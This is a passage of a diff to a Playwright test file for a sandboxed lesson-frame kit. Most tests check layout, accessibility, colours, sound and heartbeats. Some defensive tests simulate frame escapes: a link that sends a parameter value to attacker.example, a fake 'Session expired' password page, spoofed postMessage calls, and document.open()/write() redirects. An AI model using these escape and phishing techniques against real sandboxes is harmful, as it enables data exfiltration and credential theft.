@@ -9,6 +9,8 @@ import { movedValue } from '../../tools/eval/render.mjs';
 import { readFileSync, readdirSync, mkdirSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { spawnSync } from 'node:child_process';
+import { pathToFileURL } from 'node:url';
+import { chromium } from '/opt/node22/lib/node_modules/playwright/index.mjs';
 
 const OUT = join(ROOT, 'tests', 'out');
 const PAGE = join(OUT, 'kit.html');
@@ -264,10 +266,59 @@ section('self-test catches broken bodies');
       '<p class="caption" style="white-space:nowrap;overflow:hidden">short caption</p><button class="k-btn">A button</button><div class="k-bar-track" style="width:200px"><i style="width:50%"></i></div>' });
   r = await test(fine);
   expect('ordinary bodies (panels, edge labels, halos, long readout text) are not flagged', r.ok && !r.clipped.length, { clipped: r.clipped, errors: r.errors, sweep: r.sweep.problems });
+  // A screen-reader-only live region is cut off on purpose (audit 3, #41).
+  const live = (style) => body(plain + "\nK.update((p) => { K.$('#live').textContent = 'A is now ' + p.a.toFixed(1); });", { html: '<span id="live" aria-live="polite" style="' + style + '"></span>' });
+  for (const [what, style] of [['clip: rect(0 0 0 0)', 'position:absolute;width:1px;height:1px;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap'],
+    ['clip-path: inset(50%)', 'position:absolute;width:1px;height:1px;overflow:hidden;clip-path:inset(50%)'],
+    ['an off-screen 1 px box', 'position:absolute;left:-10000px;width:1px;height:1px;overflow:hidden']]) {
+    r = await test(live(style), { widths: [340] });
+    expect('a screen-reader-only live region (' + what + ') is not flagged as cut off', r.ok && !r.clipped.length, r.clipped);
+  }
+  // Diagonal timeline years only collide when the words themselves touch (audit 3, #42).
+  const years = (gap) => '<svg viewBox="0 0 340 120" width="100%" role="img" aria-label="timeline"><line x1="20" y1="40" x2="330" y2="40" stroke="currentColor"/>' +
+    ['1200 BCE', '1190 BCE', '1180 BCE', '1170 BCE', '1160 BCE', '1150 BCE', '1140 BCE'].map((y, i) => { const x = 75 + i * gap; return '<text x="' + x + '" y="52" font-size="12" text-anchor="end" transform="rotate(-45 ' + x + ' 52)">' + y + '</text>'; }).join('') + '</svg>';
+  r = await test(body(plain, { html: years(42) }));
+  expect('diagonal labels 42 units apart are not "printed over each other"', r.ok && !r.clipped.length, r.clipped);
+  r = await test(body(plain, { html: years(6) }), { widths: [340] });
+  expect('...but diagonal labels that do touch still fail', !r.ok && has(r.clipped, /SVG labels "1200 BCE" and "1190 BCE" are printed over each other/), r.clipped);
 
   // The model's outputs are numbers or short strings.
   r = await test(body("K.model((p) => ({ y: p.a, order: ['x', 'y'] }));"));
   expect('a model output that is a list fails', !r.ok && has(r.sweep.problems, /returned an array for "order"/), r.sweep);
+
+  // A broken value anywhere Dan reads it fails, not only in a readout or a plot (audit 3, #17).
+  r = await test(body("K.model((p) => ({ y: p.a * 2, eff: Math.sqrt(p.a - 0.6) * 100 }));\nK.update((p, o) => { K.$('#say').textContent = 'Efficiency is ' + o.eff.toFixed(1) + '% here.'; });", { html: '<p id="say"></p>' }), { widths: [340] });
+  expect('NaN in the say sentence fails, quoting it with the setting', !r.ok && has(r.sweep.problems, /the page shows NaN: "Efficiency is NaN% here\." \(in <p#say>\) \(at the opening state/), r.sweep);
+  expect('...and the model output that was NaN is named, though no readout shows it', has(r.sweep.problems, /the model returned NaN for "eff" \(at the opening state/), r.sweep);
+  r = await test(body(plain + "\nK.update((p) => { K.$('#say').textContent = 'It lands ' + K.fmt(Math.sqrt(p.a - 0.6)) + ' m away.'; });", { html: '<p id="say"></p>' }), { widths: [340] });
+  expect('K.fmt given NaN fails instead of quietly showing a dash', !r.ok && has(r.sweep.problems, /K\.fmt was given NaN, so it showed "—"/), r.sweep);
+  r = await test(body(plain + "\nK.update((p) => { K.$('#t').textContent = (1 / (p.a - 0.5)) + ' turns'; K.$('#dot').setAttribute('cx', 10 / (p.a - 0.5)); });",
+    { html: '<svg viewBox="0 0 200 40" width="100%" role="img" aria-label="x"><circle id="dot" cx="10" cy="20" r="4"/><text id="t" x="10" y="36" font-size="12"></text></svg>' }), { widths: [340] });
+  expect('Infinity in an SVG label, and in a drawing\'s numbers, fails at the setting that breaks it',
+    !r.ok && has(r.sweep.problems, /the page shows Infinity: "Infinity turns" .*\(at the opening state/) && has(r.sweep.problems, /an SVG <circle#dot> has cx="Infinity", so it is not drawn/), r.sweep);
+  r = await test(body(plain + "\nconst L = { a: 3 };\nK.update((p) => { K.$('#say').textContent = 'The answer is ' + L[p.a > 0.5 ? 'a' : 'b'] + ' metres.'; });", { html: '<p id="say"></p>' }), { widths: [340] });
+  expect('"undefined" where a value belongs fails', !r.ok && has(r.sweep.problems, /the page shows undefined: "The answer is undefined metres\."/), r.sweep);
+  r = await test(body(plain + "\nK.update((p) => { K.$('#say').textContent = p.a === 0 ? 'At zero the slope is undefined.' : 'The slope is ' + K.fmt(1 / p.a) + '.'; });",
+    { html: '<p id="say"></p><p class="caption">In a spreadsheet, 0 / 0 gives NaN and 1 / 0 gives Infinity.</p>' }), { widths: [340] });
+  expect('...but the same words written on purpose (a quoted "undefined at zero", a caption about NaN) pass', r.ok, r.sweep.problems.concat(r.errors));
+
+  // Dan must be able to reach the controls (audit 3, #18).
+  r = await test('<div class="k-after-move"><div class="k-controls" id="c"></div></div><div class="k-readouts" id="o"></div><script>\n' +
+    "K.control({ id: 'a', label: 'A', min: 0, max: 1, step: 0.1, value: 0.5, into: '#c' });\nK.readout({ id: 'y', label: 'Y', into: '#o' });\n" + plain +
+    "\nK.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>", { widths: [340] });
+  expect('controls kept hidden until a move (so nothing can ever be moved) fail', !r.ok && has(r.sweep.problems, /Dan cannot reach any control when the page opens: control "a" is hidden/), r.sweep);
+  r = await test(body(plain + "\nlet fall = 0;\nK.anim({ label: 'Drop the ball', step: (dt) => { fall += dt; } });"), { widths: [340] });
+  expect('a K.anim with no into: (no Play button anywhere) fails', !r.ok && has(r.sweep.problems, /K\.anim "Drop the ball" has no into:, so its Play button is not on the page/), r.sweep);
+  r = await test(body(plain + "\nK.control({ id: 'b', label: 'B', min: 0, max: 1, into: '#more' });", { html: '<div class="k-controls k-after-move" id="more"></div>' }), { widths: [340] });
+  expect('...while a second control shown after the first move passes', r.ok, r.sweep.problems);
+
+  // Sound that plays from K.update would start again on every change (audit 3, #19).
+  r = await test(body(plain + "\nK.update((p) => { K.sound.tone(200 + p.a * 600, { dur: 1 }); });"), { widths: [340] });
+  expect('K.sound.tone played from K.update fails', !r.ok && has(r.sweep.problems, /K\.sound played from K\.update, which runs on every change/), r.sweep);
+  r = await test(body(plain + "\nK.update((p) => { K.sound.hold(200 + p.a * 600); });"), { widths: [340] });
+  expect('...and so does a K.sound.hold started there', !r.ok && has(r.sweep.problems, /K\.sound played from K\.update/), r.sweep);
+  r = await test(body(plain + "\nlet hum = null;\nK.button({ label: 'Hum', into: '#c', press: () => { hum = K.sound.hold(440); } });\nK.update((p) => { if (hum) hum.set({ hz: 200 + p.a * 600 }); });"), { widths: [340] });
+  expect('...while a hum started from a button and followed with set() in K.update passes', r.ok && !has(r.warnings, /before Dan pressed/), r);
 
   // Kept-until-moved parts are checked too.
   r = await test(body(plain, { html: '<p class="k-after-move" id="ans" style="width:90px;overflow:hidden;white-space:nowrap">the hidden answer is long</p>' }));
@@ -352,12 +403,64 @@ section('self-test catches broken bodies');
   expect('a body cannot reach the network: XHR, beacon, image, WebSocket, stylesheet and a nested frame are all blocked', leaks.length === 0 && Array.isArray(v) && ['connect-src', 'img-src', 'style-src-elem'].every((d) => v.includes(d)), { leaks, violations: v });
   r = await test(body(plain + "\nK.button({ label: 'Go', into: '#c', press: () => { location.href = 'https://example.org/?typed=' + 1; } });"));
   expect('a body that navigates its frame away is refused', !r.ok && has(r.errors, /may not navigate, open connections or make frames \(found "location\.href =/), r.errors);
+
+  // A body can still leave by a route the scan can't see (a link it makes and clicks). The page it
+  // lands on has no CSP and claims to be the kit: it says ready, resizes, reports a change, and
+  // keeps its own load event from ever firing. (Audit 3, #22.)
+  const visits = [];
+  await app.context.route('https://attacker.example/**', (q) => {
+    const url = q.request().url();
+    visits.push(url);
+    if (/hang\.png/.test(url)) return;   // never answered: the landing page never finishes loading
+    q.fulfill({ contentType: 'text/html', body: '<!doctype html><body><p>Session expired. Your password:</p><input id="pw"><img src="https://attacker.example/hang.png"><script>' +
+      "function claim() { parent.postMessage({ src: 'kit', type: 'ready', checks: [] }, '*'); parent.postMessage({ src: 'kit', type: 'height', px: 999 }, '*');" +
+      " parent.postMessage({ src: 'kit', type: 'change', params: { a: 99 }, outputs: { y: 42 } }, '*'); } claim(); setInterval(claim, 100);" + '</' + 'script></body>' });
+  });
+  const escape = "K.button({ label: 'Leave', into: '#c', press: () => { const a = document.createElement('a'); a.href = 'https://attacker.example/frame.html?d=' + K.params().a; document.body.appendChild(a); a.click(); } });";
+  r = await test(body(plain + '\n' + escape), { widths: [340] });
+  expect('the self-test catches a body that navigates its frame when a button is pressed', !r.ok && has(r.errors, /navigated its frame away/), r.errors);
+  await app.page.evaluate(async (html) => {
+    const nav = window.__nav = { changes: [], errors: [], readies: 0 };
+    const box = document.body.appendChild(document.createElement('div'));
+    nav.m = U.sandbox.mount(box, { html, onChange: (st) => nav.changes.push(st), onError: (e) => nav.errors.push(e), onReady: () => { nav.readies++; } });
+    await nav.m.ready;
+    await new Promise((res) => setTimeout(res, 300));
+  }, body(plain + '\n' + escape + "\nsetTimeout(() => { parent.postMessage({ src: 'kit', type: 'height', px: 7 }, '*'); parent.postMessage({ src: 'kit', type: 'change', params: { a: 77 }, outputs: {} }, '*'); }, 50);"));
+  const before = await app.page.evaluate(() => ({ h: __nav.m.frame.getBoundingClientRect().height, changes: __nav.changes.length }));
+  expect('messages the body posts itself (without the kit\'s token) are ignored', before.h > 100 && before.changes === 0, before);
+  const navFrame = await (await app.page.evaluateHandle(() => __nav.m.frame)).asElement().contentFrame();
+  await navFrame.$eval('button.k-btn', (b) => b.click());
+  await app.page.waitForTimeout(1500);
+  const after = await app.page.evaluate(async () => ({
+    mounted: __nav.m.el.isConnected || __nav.m.frame.isConnected, errors: __nav.errors, readies: __nav.readies,
+    fake: __nav.changes.filter((c) => c.params && c.params.a === 99).length, get: await __nav.m.get().then(() => 'answered', (e) => e.code),
+  }));
+  const landed = app.page.frames().filter((f) => !f.isDetached() && f.url().startsWith('https://attacker.example/'));
+  expect('a frame that navigates away is removed at once: the page it lands on is never left in the lesson, and nothing it says is believed',
+    !after.mounted && !landed.length && after.errors.some((e) => /tried to leave its page/.test(e)) && after.readies === 1 && !after.fake && after.get === 'gone', { after, landed: landed.map((f) => f.url()), visits });
+  // A frame moved in the page reloads the kit from its srcdoc (a new window): that one is kept.
+  const moved = await app.page.evaluate(async (html) => {
+    const errs = [];
+    const a = document.body.appendChild(document.createElement('div')), b = document.body.appendChild(document.createElement('div'));
+    const m = U.sandbox.mount(a, { html, onError: (e) => errs.push(e) });
+    await m.ready;
+    await m.set('a', 0.2);
+    b.appendChild(m.el);
+    await new Promise((res) => setTimeout(res, 1500));
+    const got = await m.get().then((s) => s.params.a, (e) => e.code);
+    const out = { connected: m.el.isConnected, got, errs };
+    m.destroy();
+    return out;
+  }, body(plain));
+  expect('...while a frame moved in the page keeps working (the kit loads again from its srcdoc)', moved.connected && moved.got === 0.5 && !moved.errs.length, moved);
   r = await test(body(plain, { html: '<p>Read <a href="https://example.org/more">more</a></p>' }));
   expect('a link out of the page is refused', !r.ok && has(r.errors, /Links and forms that leave the page are not allowed: <a https:\/\/example\.org\/more>/), r.errors);
   r = await test(body(plain + "\nconst pc = window.RTCPeerConnection; K.check('no peer connections', () => pc === undefined);"));
   expect('peer-to-peer connections are not available in the frame', r.checks.some((c) => c.label === 'no peer connections' && c.ok), r.checks);
   expect('...and naming them in a body is refused', !r.ok && has(r.errors, /found "RTCPeerConnection"/), r.errors);
   expect('srcdoc starts with the Content-Security-Policy', await app.page.evaluate(() => /^<!doctype html><html lang="en"><head><meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'/.test(U.sandbox.srcdoc('<p>x</p>'))));
+  r = await test(body(plain + "\nconst seen = document.documentElement.innerHTML;\nK.check('the body cannot read the frame\\'s token', () => window.K_TOKEN === undefined && !seen.includes('K_' + 'TOKEN=\"'));"), { widths: [340] });
+  expect('the kit takes the frame\'s token and removes it before the body runs', r.checks.some((c) => /token/.test(c.label) && c.ok), r.checks);
   app.errors.splice(0);
   await app.close();
 }
@@ -427,6 +530,15 @@ section('the kit in a live frame');
   await fr.click('.k-seg button:nth-child(1)');
   await app.page.waitForTimeout(150);
   expect('tapping an option sets it', (await host(() => window.m.get())).params.pick === 'a');
+  const segs = await fr.evaluate(() => [...document.querySelectorAll('.k-seg button')].map((b) => Math.round(b.getBoundingClientRect().height)));
+  expect('named-choice options are tap targets at least 44 px tall (audit 3, #50)', segs.length === 6 && segs.every((h) => h >= 44), segs);
+  // Options named by digits: a number is the lesson's 0-based index, a string the option's name (audit 3, #45).
+  fr = await live('<div class="k-controls" id="c"></div><script>\n' +
+    "K.choice({ id: 'n', label: 'Copies', options: ['1', '2', '4', '8'], value: 1, into: '#c' });\nK.model((p) => ({ n: +p.n }));\n" +
+    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>");
+  const digits = [(await host(() => window.m.get())).params.n, (await host(() => window.m.set('n', 2))).params.n, (await host(() => window.m.set('n', '8'))).params.n];
+  const checked = await fr.evaluate(() => [...document.querySelectorAll('.k-seg button')].map((b) => b.getAttribute('aria-checked')).join());
+  expect('a choice of "1", "2", "4", "8" with value 1 opens on "2"; set(2) picks "4" and set("8") picks "8"', digits.join() === '2,4,8' && checked === 'false,false,false,true', { digits, checked });
 
   // Small-screen layout at 340 px wide.
   const layout = '<div class="k-controls" id="c"></div><div class="k-readouts" id="o"></div><script>\n' +
@@ -477,6 +589,32 @@ section('the kit in a live frame');
   expect('dark mode: fills and highlights stand out from the page (contrast >= 1.6), lines and categories >= 3',
     pal.dark && ['fill1', 'fill2', 'fill3', 'hl'].every((k) => pal[k] >= 1.6) && ['amber-line', 'cat1', 'cat2', 'cat3', 'cat4', 'accent2'].every((k) => pal[k] >= 3) && pal.inkOnFill2 >= 3.5, pal);
   expect('K.color(role, alpha) gives a see-through colour', /^rgba\(\d+, \d+, \d+, 0\.3\)$/.test(pal.alpha), pal.alpha);
+  // Colours given as var(--k-…) (as KIT.md shows) or as colour words draw as their role, so a plot
+  // line, its legend key and a band agree and follow the theme (audit 3, #20).
+  fr = await live('<div id="pl"></div><div class="k-controls" id="c"></div><script>\n' +
+    "K.control({ id: 'k', label: 'k', min: 0, max: 1, step: 0.5, value: 0.5, into: '#c' });\nconst pl = K.plot('#pl', { x: { min: 0, max: 10 }, y: { min: 0, max: 10 } });\n" +
+    "K.update(() => pl.draw({ series: [{ fn: () => 2, label: 'Safe' }, { fn: () => 8, label: 'Danger', color: 'var(--k-warn)' }, { fn: () => 5, label: 'Navy', color: 'navy' }], regions: [{ x0: 6, x1: 8, color: 'var(--k-fill3)' }] }));\n" +
+    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>");
+  for (const mode of ['dark', 'light']) {
+    await app.page.evaluate((t) => { document.documentElement.dataset.muTheme = t; }, mode);
+    await app.page.waitForTimeout(300);
+    const cl = await fr.evaluate(() => {
+      const api = K.$('#pl').__kplot, cv = api.canvas, c2 = cv.getContext('2d'), dpr = cv.width / cv.clientWidth;
+      const px = (x, y) => [...c2.getImageData(Math.round(api.x(x) * dpr), Math.round(api.y(y) * dpr), 1, 1).data];
+      const rgb = (c) => { const d = document.createElement('i'); d.style.color = c; document.body.appendChild(d); const v = getComputedStyle(d).color.match(/\d+/g).slice(0, 3).map(Number); d.remove(); return v; };
+      return { danger: px(3, 8), navy: px(3, 5), band: px(7, 3), warn: rgb(K.theme.c.warn), accent2: rgb(K.theme.c.accent2), fill3: rgb(K.theme.c.fill3),
+        keys: [...document.querySelectorAll('.k-key i')].map((i) => getComputedStyle(i).borderTopColor.match(/\d+/g).slice(0, 3).map(Number)),
+        alpha: K.color('var(--k-fill2)', 0.3), fill2: rgb(K.theme.c.fill2) };
+    });
+    const same = (a, b, tol = 12) => a && b && [0, 1, 2].every((i) => Math.abs(a[i] - b[i]) <= tol);
+    expect(mode + ': a series coloured var(--k-warn) is drawn in the theme\'s warn colour, and its legend key agrees', same(cl.danger, cl.warn) && same(cl.keys[1], cl.warn), cl);
+    expect(mode + ': a series coloured \'navy\' is drawn as accent2 (it follows the theme)', same(cl.navy, cl.accent2) && same(cl.keys[2], cl.accent2), cl);
+    expect(mode + ': a band coloured var(--k-fill3) is tinted with fill3, not black; K.color(var(--k-fill2), 0.3) is see-through fill2',
+      same(cl.band, cl.fill3, 3) && cl.band[3] > 60 && cl.alpha === 'rgba(' + cl.fill2.join(', ') + ', 0.3)', cl);
+  }
+  const colourRep = await host(() => window.m.selftest());
+  expect('...and the colour word gets advice to use a role', colourRep.warnings.some((w) => /K\.color\('navy'\) is not a colour role, so it was drawn as 'accent2'/.test(w)), colourRep.warnings);
+
   await app.page.evaluate(() => { document.documentElement.dataset.muTheme = 'light'; });
   await app.page.waitForTimeout(300);
   const palL = await fr.evaluate(() => ({ fill2: getComputedStyle(document.documentElement).getPropertyValue('--k-fill2').trim(), amberLine: K.theme.c.amberLine, dark: K.theme.dark }));
@@ -524,12 +662,56 @@ section('the kit in a live frame');
   expect('K.sound stays silent on load (with advice) and plays after a press, under the CSP', !before.playing && after.playing && after.ready && !after.muted && sw.warnings.some((w) => /before Dan pressed anything/.test(w)), { before, after, w: sw.warnings });
   await fr.evaluate(() => K.sound.stop());
 
+  // An animation Dan plays keeps the app told he is busy (its study minutes): Play and Pause post
+  // a change at once, and a playing one posts at least every 2 s, also while it drives a slider
+  // (each set() used to restart the 250 ms wait, so nothing came until it stopped). One that
+  // plays by itself, with Dan never touching the page, posts nothing.
+  const animBody = (auto) => '<div class="k-controls" id="c"></div><p id="say"></p><script>\n' +
+    "const pos = K.control({ id: 'x', label: 'Position', min: 0, max: 100, step: 1, value: 0, into: '#c' });\nlet exact = null;\n" +
+    "K.anim({ label: 'Play', into: '#c'" + (auto ? ', autoplay: true' : '') + ", step: (dt) => { const from = exact !== null && Math.abs(exact - pos.get()) < 1 ? exact : pos.get(); exact = (from + dt * 5) % 100; pos.set(exact); } });\n" +
+    "K.update((p) => { K.$('#say').textContent = 'At ' + p.x + ' along.'; });\n" +
+    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>";
+  const watch = async (html) => {
+    await host(async (h) => {
+      if (window.m) window.m.destroy();
+      window.__ch = [];
+      const box = document.body.appendChild(document.createElement('div'));
+      window.m = U.sandbox.mount(box, { html: h, onChange: (st) => window.__ch.push(st.params.x) });
+      await window.m.ready;
+    }, html);
+    return app.page.frames().filter((f) => f !== app.page.mainFrame() && !f.isDetached() && f.url() === 'about:srcdoc').pop();
+  };
+  fr = await watch(animBody(false));
+  const count = () => host(() => window.__ch.length);
+  await fr.click('.k-anim button');
+  await app.page.waitForTimeout(600);
+  const atPlay = await count();
+  await app.page.waitForTimeout(4400);
+  const whilePlaying = await count();
+  await fr.click('.k-anim button');
+  await app.page.waitForTimeout(400);
+  const atPause = await count();
+  expect('Play posts a change at once, a playing animation driving a slider posts one at least every 2 s, and Pause posts one',
+    atPlay >= 1 && whilePlaying - atPlay >= 2 && atPause > whilePlaying, { atPlay, whilePlaying, atPause, xs: await host(() => window.__ch) });
+  fr = await watch(animBody(true));
+  await app.page.waitForTimeout(4500);
+  const auto = { n: await count(), x: await host(() => window.m.get().then((st) => st.params.x)) };
+  expect('an animation playing by itself (Dan has not touched the page) posts no change', auto.n === 0 && auto.x > 0, auto);
+  await host(() => { window.m.destroy(); window.m = null; });
+
   // Figures are capped on desktop and centred, and fill the phone.
   const figBody = '<svg id="fig" viewBox="0 0 340 200" width="100%" role="img" aria-label="f"><rect width="340" height="200" fill="var(--k-panel)"/><text x="10" y="20" font-size="12">label</text></svg>' +
     '<p>Icon <svg id="icon" viewBox="0 0 16 16" width="16" height="16"><circle cx="8" cy="8" r="6"/></svg> inline</p>' + body(plain);
   fr = await live(figBody);
   const phone = await fr.evaluate(() => ({ w: K.$('#fig').getBoundingClientRect().width, col: document.body.clientWidth - 32, fig: K.$('#fig').classList.contains('k-fig'), icon: K.$('#icon').classList.contains('k-fig') }));
   expect('at phone width a figure fills the column', phone.fig && !phone.icon && Math.abs(phone.w - phone.col) <= 2, phone);
+  // A canvas K.stage shrinks to fit a phone keeps its shape: a circle stays round (audit 3, #21).
+  fr = await live('<canvas id="cv" width="680" height="800"></canvas><div class="k-controls" id="c"></div><script>\n' +
+    ['a', 'b', 'c'].map((id) => "K.control({ id: '" + id + "', label: 'Setting " + id + "', min: 0, max: 1, step: 0.1, value: 0.5, into: '#c' });").join('\n') +
+    "\nK.stage('#cv', '#c');\nconst cx = K.$('#cv').getContext('2d'); cx.beginPath(); cx.arc(340, 400, 300, 0, 7); cx.fill();\n" +
+    "K.check('one', () => true); K.check('two', () => true); K.check('three', () => true);\nK.ready();\n</script>");
+  const cvs = await fr.evaluate(() => { const r = K.$('#cv').getBoundingClientRect(), st = document.querySelector('.k-stage').getBoundingClientRect(); return { w: r.width, h: r.height, stage: st.height, page: document.documentElement.clientWidth }; });
+  expect('a 680 x 800 canvas in a K.stage on a phone is capped in height and keeps its 0.85 shape', cvs.page < 560 && cvs.stage <= 602 && Math.abs(cvs.w / cvs.h - 0.85) < 0.01, cvs);
   await app.close();
 
   const wide = await openApp({ width: 1280, height: 900, file: PAGE });
@@ -618,6 +800,247 @@ section('the kit in a live frame');
   await wide.close();
 }
 
+// ---------- a frame that stops being the kit is removed (audit 3, #22 residual) ----------
+section('a frame that stops being the kit');
+{
+  const app = await openApp({ width: 360, height: 800, file: PAGE });
+  await app.page.goto(app.url('#/'));
+  await app.page.evaluate(() => U.rt.ready);
+  // The skeptic's reproduction: with no press at all, a timer calls document.open() (which erases
+  // the kit's beforeunload / pagehide listeners, so no 'leaving' came) and sends the frame to a page
+  // whose load event never fires (so no second load either). It stayed in the lesson, taking
+  // keystrokes. Also: the same after redefining the getters a check might read, and
+  // document.write() after load (an implicit open) with no navigation at all.
+  let served = 0;
+  await app.context.route('https://remote.example/**', (q) => {
+    if (/hang/.test(q.request().url())) return;   // never answered: the landing page never finishes loading
+    served++;
+    q.fulfill({ contentType: 'text/html', body: '<!doctype html><body><h1>remote content</h1><input id="field"><img src="https://remote.example/hang"><script>' +
+      "addEventListener('message', (e) => { if (e.data && e.data.type === 'ping') parent.postMessage({ src: 'kit', type: 'pong', rid: e.data.rid }, '*'); });" + '</' + 'script></body>' });
+  });
+  const later = (js) => body(plain + '\nsetTimeout(function () { ' + js + ' }, 1200);');
+  const attacks = {
+    'document.open(), then a page that never loads': later("document.open(); window['loc' + 'ation'].href = 'https://remote.example/land?v=1&d=' + K.params().a;"),
+    '...after redefining documentElement and parentNode': later("const r = document.documentElement; Object.defineProperty(Document.prototype, 'documentElement', { get() { return r; } }); Object.defineProperty(Node.prototype, 'parentNode', { get() { return document; } }); document.open(); window['loc' + 'ation'].href = 'https://remote.example/land?v=2';"),
+    'document.write() after load': later("document.write('<p>replaced</p>');"),
+  };
+  await app.page.evaluate(async (list) => {
+    window.__att = {};
+    await Promise.all(Object.entries(list).map(async ([name, html]) => {
+      const a = window.__att[name] = { errors: [] };
+      a.m = U.sandbox.mount(document.body.appendChild(document.createElement('div')), { html, onError: (e) => a.errors.push(e) });
+      await a.m.ready;
+    }));
+  }, attacks);
+  const state = () => app.page.evaluate(() => Object.fromEntries(Object.entries(window.__att).map(([k, a]) => [k, { mounted: a.m.el.isConnected || a.m.frame.isConnected, errors: a.errors }])));
+  await app.page.waitForTimeout(2600);
+  const soon = await state();
+  const remote = () => app.page.frames().filter((f) => !f.isDetached() && f.url().startsWith('https://remote.example/')).map((f) => f.url());
+  for (const name of Object.keys(attacks)) {
+    expect('a body that throws its page away with ' + name + ' is removed at once (by 2.6 s)', !soon[name].mounted && soon[name].errors.some((e) => /tried to leave its page/.test(e)), soon[name]);
+  }
+  await app.page.waitForTimeout(4000);
+  // (The navigation's request may still go out, as the policy cannot stop it; the frame is gone first.)
+  expect('...no page it was sent to is left in the frame, and none comes back', !remote().length && Object.values(await state()).every((a) => !a.mounted), { remote: remote(), served });
+  // The page still works: an honest frame mounted now is kept, and answers.
+  const honest = await app.page.evaluate(async (html) => {
+    const errs = [];
+    const m = U.sandbox.mount(document.body.appendChild(document.createElement('div')), { html, onError: (e) => errs.push(e) });
+    await m.ready;
+    await new Promise((r) => setTimeout(r, 7000));
+    const got = await m.get().then((s) => s.outputs.y, (e) => e.code);
+    const out = { mounted: m.el.isConnected, got, errs };
+    m.destroy();
+    return out;
+  }, body(plain));
+  expect('an honest frame is kept through its heartbeats (7 s) and answers', honest.mounted && honest.got === 1 && !honest.errs.length, honest);
+  app.errors.splice(0);
+  await app.close();
+}
+
+// The heartbeat itself, where it matters: a frame in its own process (as on a laptop), whose page
+// can freeze while the app's own clock keeps running. Each page gets its own browser context, so a
+// frozen frame never shares a process with another test's frame.
+section('the heartbeat, frames in their own process');
+{
+  const browser = await chromium.launch({ args: ['--site-per-process', '--enable-features=IsolateSandboxedIframes'] });
+  const open = async () => {
+    const page = await (await browser.newContext({ viewport: { width: 400, height: 900 } })).newPage();
+    const errors = [];
+    page.on('pageerror', (e) => errors.push(String(e)));
+    await page.goto(pathToFileURL(PAGE).href + '#/');
+    await page.waitForFunction(() => window.U && U.sandbox, null, { timeout: 60000 });
+    return { page, errors };
+  };
+  // A slow but honest page: a button that computes for 3 s (pressed twice), then an animation whose
+  // every frame takes 250 ms. It answers between its tasks, so it is kept.
+  const slow = await open();
+  const slowBody = body(plain + "\nK.button({ label: 'Work', into: '#c', press: () => { const t = Date.now(); while (Date.now() - t < 3000) {} } });\n" +
+    "K.anim({ label: 'Play', into: '#c', step: () => { const t = Date.now(); while (Date.now() - t < 250) {} } });");
+  const kept = await slow.page.evaluate(async (html) => {
+    const errs = [];
+    const m = U.sandbox.mount(document.body.appendChild(document.createElement('div')), { html, onError: (e) => errs.push(e) });
+    await m.ready;
+    let ticks = 0;
+    const iv = setInterval(() => ticks++, 100);
+    await m.press('Work');
+    const during = ticks;   // the app's clock ran while the frame computed: they are separate processes
+    await new Promise((r) => setTimeout(r, 1000));
+    await m.press('Work');
+    await m.press('Play');
+    await new Promise((r) => setTimeout(r, 6000));
+    clearInterval(iv);
+    const got = await m.get().then((s) => s.outputs.y, (e) => e.code);
+    const out = { during, mounted: m.el.isConnected, got, errs };
+    m.destroy();
+    return out;
+  }, slowBody);
+  expect('(the frame runs in its own process here: the app\'s clock ran while it computed)', kept.during >= 20, kept);
+  expect('a slow but honest page (3 s computations, 250 ms animation frames) is kept and answers', kept.mounted && kept.got === 1 && !kept.errs.length, kept);
+  // A page frozen for good after it started, and one frozen before the kit ever spoke.
+  const frozen = await open(), early = await open();
+  const freezeBody = body(plain + "\nK.button({ label: 'Freeze', into: '#c', press: () => { for (;;) {} } });");
+  await frozen.page.evaluate(async (html) => {
+    const f = window.__f = { errors: [] };
+    f.m = U.sandbox.mount(document.body.appendChild(document.createElement('div')), { html, onError: (e) => f.errors.push(e) });
+    await f.m.ready;
+    f.m.press('Freeze').catch(() => {});
+    f.t0 = Date.now();
+    f.gone = new Promise((res) => { const iv = setInterval(() => { if (!f.m.el.isConnected) { clearInterval(iv); res(Date.now() - f.t0); } }, 50); setTimeout(() => res(null), 9000); });
+  }, freezeBody);
+  await early.page.evaluate((html) => {
+    const f = window.__f = { errors: [], shown: false };
+    f.m = U.sandbox.mount(document.body.appendChild(document.createElement('div')), { html, onError: (e) => f.errors.push(e) });
+    f.t0 = Date.now();
+    f.gone = new Promise((res) => { const iv = setInterval(() => { if (f.m.el.dataset.state === 'live') f.shown = true; if (!f.m.el.isConnected) { clearInterval(iv); res(Date.now() - f.t0); } }, 50); setTimeout(() => res(null), 16000); });
+  }, '<p>never</p><script>for (;;) {}</script>');
+  const fr = await frozen.page.evaluate(async () => ({ after: await __f.gone, errors: __f.errors }));
+  expect('a frame that stops answering is closed after 4-6 s of silence, as "stopped answering"', fr.after !== null && fr.after >= 3000 && fr.after <= 7500 && fr.errors.some((e) => /stopped answering/.test(e)), fr);
+  const er = await early.page.evaluate(async () => ({ after: await __f.gone, shown: __f.shown, errors: __f.errors }));
+  expect('a frame that never says anything is closed at 12 s and never shown', er.after !== null && er.after >= 11000 && er.after <= 15500 && !er.shown && er.errors.some((e) => /stopped answering/.test(e)), er);
+  expect('no page errors in the heartbeat tests', !slow.errors.length && !frozen.errors.length && !early.errors.length, [slow.errors, frozen.errors, early.errors]);
+  await browser.close();
+}
+
+// ---------- quiz mode (contract Q) and reach().exact ----------
+section('quiz mode');
+{
+  const app = await openApp({ width: 360, height: 800, file: PAGE });
+  await app.page.goto(app.url('#/'));
+  await app.page.evaluate(() => U.rt.ready);
+  const quizBody = '<div id="plot"></div><div class="k-controls" id="controls"></div><div class="k-readouts" id="outs"></div><div id="bars"></div>\n' +
+    '<p class="say" id="say"></p>\n<script>\n' +
+    'const period = (L) => 2 * Math.PI * Math.sqrt(L / 9.81);\n' +
+    "K.control({ id: 'L', label: 'String length', min: 0.1, max: 3, step: 0.05, value: 1, unit: 'm', into: '#controls' });\n" +
+    "K.stage('#plot', '#controls');\n" +
+    "K.readout({ id: 'T', label: 'One full swing takes', unit: 's', decimals: 2, into: '#outs' });\n" +
